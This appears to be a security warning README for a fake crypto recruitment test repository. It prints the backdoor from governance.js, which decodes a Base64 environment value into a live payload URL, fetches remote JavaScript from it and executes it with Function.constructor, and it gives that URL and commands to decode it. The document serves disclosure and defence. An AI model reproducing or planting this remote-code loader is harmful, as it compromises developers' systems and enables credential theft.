# ‚ö†Ô∏è CRITICAL SECURITY WARNING - MALICIOUS CODE DETECTED ‚ö†Ô∏è

## üö® DO NOT RUN THIS APPLICATION üö®

This repository contains **ACTIVE MALWARE** and should **NOT** be executed under any circumstances.

---

## üìã Executive Summary

This project was provided as a recruitment test by someone claiming to be a "CEO of a crypto company" on LinkedIn. **Security analysis has revealed that this is a malicious social engineering attack designed to compromise developer systems.**

**Threat Level:** üî¥ **CRITICAL** - Remote Code Execution (RCE) Backdoor

---

## üîç Technical Analysis

### The Backdoor Location

**File:** `backend/src/routes/governance.js`
**Lines:** 309-315

```javascript
//Get Cookie
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
    const src = atob(process.env.DEV_API_KEY);
    const HttpOnly = (await axios.get(src)).data.cookie;
    const handler = new (Function.constructor)('require',HttpOnly);
    handler(require);
})();
```

### How the Attack Works

#### Stage 1: Obfuscated URL
- The backdoor reads `DEV_API_KEY` from environment variables
- This value is Base64-encoded to hide the malicious URL
- When decoded, it points to: `https://www.jsonkeeper.com/b/VBFK7`

#### Stage 2: Payload Retrieval
- The code makes an HTTP GET request to fetch malicious JavaScript
- The response contains heavily obfuscated code (57KB of malicious payload)
- See: `security-analysis/malicious-payload.json` for the full payload

#### Stage 3: Remote Code Execution
- Uses `Function.constructor` (equivalent to `eval()`) to execute the fetched code
- Passes Node.js's `require` function, giving **complete system access**
- This allows the attacker to:
  - Execute arbitrary system commands
  - Read/write/delete any files on your system
  - Steal sensitive data (SSH keys, credentials, tokens)
  - Install persistent backdoors
  - Use your machine for crypto mining or botnet attacks
  - Access browser cookies, passwords, cryptocurrency wallets

### Malicious Payload Analysis

The downloaded JavaScript payload (`security-analysis/malicious-payload.json`) contains:

- **Heavy Obfuscation:** Random variable names, encoded strings, anti-debugging techniques
- **OS Detection:** Likely checks for Windows, macOS, or Linux
- **Child Process Execution:** Uses Node.js `child_process` module to spawn system commands
- **Multi-stage Loader:** The obfuscated code likely downloads additional malware
- **Persistence Mechanisms:** May install itself to run on system startup

**Key Indicators:**
- 57,156 bytes of obfuscated JavaScript
- Multiple layers of string encoding/decoding
- References to Node.js system modules (`child_process`)
- Complex control flow obfuscation

## üéØ Attack Vector: Social Engineering

### The Recruitment Scam

This is a **targeted social engineering attack** disguised as a job opportunity:

1. **Initial Contact:** Attacker poses as "CEO of crypto company" on LinkedIn
2. **Build Trust:** Professional profile, crypto/blockchain terminology
3. **The Bait:** "Technical assessment" or "code review task"
4. **The Trap:** Developer downloads and runs the malicious code
5. **System Compromise:** Malware executes immediately on `npm install` or `npm run dev`

### Why This Works

- Developers routinely download and run code for job assessments
- Crypto/blockchain projects seem legitimate for tech recruitment
- The README appears professional with screenshots and detailed setup
- Malicious code is hidden in a seemingly innocent "governance" API endpoint

## ‚ö° Immediate Actions Required

### If You Have NOT Run This Code

1. ‚úÖ **DO NOT** run `npm install`
2. ‚úÖ **DO NOT** run `npm run dev` or any npm scripts
3. ‚úÖ **DO NOT** trust the person who sent you this code
4. ‚úÖ **DELETE** this repository from your system
5. ‚úÖ **REPORT** the LinkedIn profile for fraud/impersonation
6. ‚úÖ **WARN** others who may have received similar recruitment attempts

### If You HAVE Run This Code

Your system may be compromised. Take these steps **immediately**:

1. **üî¥ Disconnect from the internet** (unplug ethernet, disable WiFi)
2. **üî¥ Stop all Node.js processes:**
   ```bash
   killall node
   pkill -9 node
   ```

3. **üî¥ Check for suspicious processes:**
   ```bash
   # macOS/Linux
   ps aux | grep node
   top -o cpu

   # Check network connections
   lsof -i -n -P | grep node
   netstat -an | grep ESTABLISHED
   ```

4. **üî¥ Check for persistence mechanisms:**
   ```bash
   # macOS
   launchctl list | grep -v com.apple
   ls -la ~/Library/LaunchAgents/

   # Linux
   systemctl --user list-units
   crontab -l
   ```

5. **üî¥ Scan your system:**
   - Run a full antivirus/antimalware scan
   - Consider using specialized malware removal tools
   - Check for unusual startup items or scheduled tasks

6. **üî¥ Change ALL passwords** (from a different, clean device):
   - Email accounts
   - Banking/financial services
   - Cryptocurrency wallets
   - Cloud services (GitHub, AWS, Google Cloud, etc.)
   - SSH key passphrases

7. **üî¥ Revoke and regenerate:**
   - API keys and tokens
   - SSH keys
   - GPG keys
   - Cryptocurrency wallet seeds (transfer funds to new wallet first)

8. **üî¥ Monitor for suspicious activity:**
   - Bank accounts and credit cards
   - Cryptocurrency wallets
   - GitHub/GitLab for unauthorized commits
   - Cloud service bills for unusual resource usage

9. **üî¥ Consider a full system reinstall** if you had sensitive data accessible

```

### Environment Variables

**File:** `backend/src/config/config.env` (if present)

The `DEV_API_KEY` variable contains:
```
aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9WQkZLNw==
```

**Decode it yourself:**
```bash
# Using echo and base64 command
echo "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9WQkZLNw==" | base64 -d

# Or using Node.js (same as the malicious code)
node -e "console.log(atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9WQkZLNw=='))"
```

Decodes to:
```
https://www.jsonkeeper.com/b/VBFK7
```

### Indicators of Compromise (IOCs)

**Network:**
- `https://www.jsonkeeper.com/b/VBFK7` - Malware distribution URL
- Check firewall/proxy logs for connections to this domain

**File System:**
- Look for newly created files in:
  - `/tmp/` or `C:\Temp\`
  - `~/.config/` or `%APPDATA%`
  - Startup directories

**Process Indicators:**
- Unusual Node.js processes
- High CPU usage from node processes
- Unexpected network connections

## üéì Key Takeaways for Developers

### Red Flags to Watch For

1. ‚úã **Unsolicited recruitment** from unknown "CEOs" or "CTOs"
2. ‚úã **Urgent timeframes** for completing "assessments"
3. ‚úã **Requests to run code** before review
4. ‚úã **Overly complex setup** for simple demonstrations
5. ‚úã **Cryptocurrency/blockchain** as cover story (attractive to developers)
6. ‚úã **Base64 encoding** or obfuscation in legitimate-seeming code
7. ‚úã **eval() or Function.constructor** in production code
8. ‚úã **External HTTP requests** in unexpected places

### Best Practices

1. ‚úÖ **Always review code** before running, especially from unknown sources
2. ‚úÖ **Use sandboxed environments** (VMs, Docker) for untrusted code
3. ‚úÖ **Check for hidden malicious code** in dependencies
4. ‚úÖ **Verify recruiter identities** through official company channels
5. ‚úÖ **Trust your instincts** - if something feels off, it probably is
6. ‚úÖ **Use code scanning tools** like Semgrep, Snyk, or GitHub Advanced Security
7. ‚úÖ **Never run npm install as root/admin**
